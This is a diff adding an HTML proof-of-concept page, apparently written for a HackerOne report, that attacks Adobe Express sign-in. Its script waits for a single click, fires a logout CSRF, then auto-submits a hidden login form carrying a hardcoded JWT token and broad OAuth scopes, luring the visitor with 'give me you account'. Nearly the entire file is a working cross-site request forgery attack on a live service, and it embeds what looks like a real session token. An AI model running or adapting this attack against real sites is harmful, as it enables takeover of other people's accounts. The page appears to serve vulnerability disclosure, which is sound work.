@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hackerone PoC</title>
+</head>
+<body>
+    <p>Click on the Image to give me you account!</p>
+    <img src="https://mms.businesswire.com/media/20200615005122/en/658229/23/hackerone_logo_black.jpg">
+    <script>
+        function handleOnClick() {
+  // Open tab with victim session 
+  var newTab = window.open('https://new.express.adobe.com/abababa');
+// Logout CSRF
+  setTimeout(function() {
+    var logoutcsrf = window.open('https://ims-na1.adobelogin.com/ims/logout/v1?redirect_uri=https%3A%2F%2Fnew.express.adobe.com%2F%23old_hash%3D%26from_ims%3Dtrue%3Fclient_id%3Dprojectx_webapp%26api%3Dlogout&client_id=projectx_webapp&jslVersion=v2-v0.31.0-2-g1e8a8a8');
+    setTimeout(function() {
+      logoutcsrf.close();
+    }, 100);
+  }, 3000);
+
+    setTimeout(function() {
+    var a = window.open('', '_blank');
+    var formContent = ('<form action="https://adobeid-na1.services.adobe.com/ims/fromSusi" method="POST">' +
+        '<input type="hidden" name="remember_me" value="true" />' +
+        '<input type="hidden" name="callback" value="https://ims-na1.adobelogin.com/ims/adobeid/projectx_webapp/AdobeID/token?redirect_uri=https%3A%2F%2Fnew.express.adobe.com%2F%23old_hash%3Dotp%3D876991630%26from_ims%3Dtrue%3Fclient_id%3Dprojectx_webapp%26api%3Dauthorize%26scope%3Dab.manage%2CAdobeID%2Copenid%2Cread_organizations%2Ccreative_cloud%2Ccreative_sdk%2Ctk_platform%2Ctk_platform_sync%2Caf_byof%2Cstk.a.license_skip.r%2Cstk.a.limited_license.cru%2Cadditional_info.optionalAgreements%2Cuds_read%2Cuds_write%2Caf.ltd.projectx%2Cunified_dev_portal%2Cadditional_info.ownerOrg%2Cadditional_info.roles%2Cadditional_info.roles%2CDCAPI%2Cadditional_info.auth_source%2Cadditional_info.authenticatingAccount%2Cpps.write%2Cpps.delete%2Ctk_platform_grant_free_subscription%2Cpps.read%2Cfirefly_api%2Cadditional_info.projectedProductContext&code_challenge_method=plain&use_ms_for_expiry=true" />' +
+        '<input type="hidden" name="client_id" value="projectx_webapp" />' +
+        '<input type="hidden" name="scope" value="ab.manage,AdobeID,openid,read_organizations,creative_cloud,creative_sdk,tk_platform,tk_platform_sync,af_byof,stk.a.license_skip.r,stk.a.limited_license.cru,additional_info.optionalAgreements,uds_read,uds_write,af_ltd_projectx,unified_dev_portal,additional_info.ownerOrg,additional_info.roles,DCAPI,additional_info.auth_source,additional_info.authenticatingAccount,pps.write,pps.delete,tk_platform_grant_free_subscription,pps.read,firefly_api,additional_info.projectedProductContext" />' +
+        '<input type="hidden" name="state" value="{&quot;jslibver&quot;:&quot;v2-v0.31.0-2-g1e8a8a8&quot;,&quot;nonce&quot;:&quot;2453246843001547&quot;}" />' +
+        '<input type="hidden" name="relay" value="4bccd944-2eed-4c28-be8c-b1a054355975" />' +
+        '<input type="hidden" name="locale" value="en_US" />' +
+        '<input type="hidden" name="flow_type" value="token" />' +
+        '<input type="hidden" name="idp_flow_type" value="login" />' +
+        '<input type="hidden" name="s_p" value="google,facebook,apple,microsoft" />' +
+        '<input type="hidden" name="response_type" value="token" />' +
+        '<input type="hidden" name="code_challenge_method" value="plain" />' +
+        '<input type="hidden" name="redirect_uri" value="https://new.express.adobe.com/#old_hash=otp=876991630&from_ims=true?client_id=projectx_webapp&api=authorize&scope=ab.manage,AdobeID,openid,read_organizations,creative_cloud,creative_sdk,tk_platform,tk_platform_sync,af_byof,stk.a.license_skip.r,stk.a.limited_license.cru,additional_info.optionalAgreements,uds_read,uds_write,af_ltd_projectx,unified_dev_portal,additional_info.ownerOrg,additional_info.roles,additional_info.roles,DCAPI,additional_info.auth_source,additional_info.authenticatingAccount,pps.write,pps.delete,tk_platform_grant_free_subscription,pps.read,firefly_api,additional_info.projectedProductContext" />' +
+        '<input type="hidden" name="use_ms_for_expiry" value="true" />' +
+        '<input type="hidden" name="flow" value="true" />' +
+        '<input type="hidden" name="token" value="eyJraWQiOiJzdXNpLWtleS0xIiwiYWxnIjoiUlMyNTYifQ.eyJpc3MiOiJodHRwczovL2F1dGguc2VydmljZXMuYWRvYmUuY29tIiwiYXVkIjoiaHR0cHM6Ly9pbXMtbmExLmFkb2JlbG9naW4uY29tIiwiZXhwIjoxNzA4NDU2Njc3LCJpYXQiOjE3MDg0NTY2MTcsInN1YiI6IjYzRDY0MjE1NjUyRDc1RDkwQTQ5NUZGMkBBZG9iZUlEIiwianRpIjoiakpmRC1waWZuZXUzQlpDeUF6LVdfQSIsIm5iZiI6MTcwODQ1NjYxNywiY3JlZGVudGlhbF90eXBlIjoic3NvIiwiY3JlZGVudGlhbHNfdmFsaWRhdGVkX2F0IjoiMTcwODQ1NTA5OSIsImF1dGhlbnRpY2F0aW5nX2FjY291bnRfaWQiOiI2M0Q2NDIxNTY1MkQ3NUQ5MEE0OTVGRjJAQWRvYmVJRCIsInNlc3Npb25faWQiOiIxNzA4NDUxMTkzNzYyX2JmNjBmYzIyLWU3MDEtNGIwYy1hZDliLTU4MDJmMDk2NTA4OF92YTZjMiIsInJtYyI6InRydWUifQ.raFwTyIYhVwl1XIrDRsU6OVB99IdSMwQY8vyA3f6hq5HUMkKukEanS76qvKQx1S40iK2afWWSfjM3MSnOZUMl_dmHFg8e5nmrvlvb5k3VOrdrCStbOCTe6nxAQue7XiRSRkubYWVk4c7-4OVpVidR1EhcK7dS-GggcQVu1yZsLNpiWGwyckufyuDFm_7LSZSdzgyqtxJGA_ONXgYUDobosjDgHfbSFUKeAIhhq4zDE7q6ylHrgnprTLJx7mkt9ttnkH1Sp2AJ94k9PcA3_q7P45wNkH5dAMXW1PqyACTIYwr7CzKedCBuxqMOpLdXbnEmNTk2O7CUGurZk1v2-i0XA" />' +
+        '<input type="hidden" name="probing_results" value="[0]" />' +
+        '<input type="submit" value="Submit request" />' +
+        '</form>');
+    formContent += '<scr' + 'ipt>';
+    formContent += 'setTimeout(function() {'
+    formContent += '    history.pushState("", "", "/");';
+    formContent += '    document.forms[0].submit();';
+    formContent += '}, 700);'
+    formContent += '</scr' + 'ipt>';
+    a.document.write(formContent);
+    setTimeout(function() {
+      a.close();
+    }, 1000);
+  }, 3000);
+
+
+    setTimeout(function() {
+    location.href = 'https://new.express.adobe.com/schedule?postId=be55df35-b059-44f4-a332-4b09fbf223ab'
+    setTimeout(function() {
+        pop.close();
+    }, 5000000000000);
+  }, 10000);
+}
+  
+// Attach click event listener to the window object
+    window.onclick = handleOnClick;
+    </script>
+</body>
+</html>
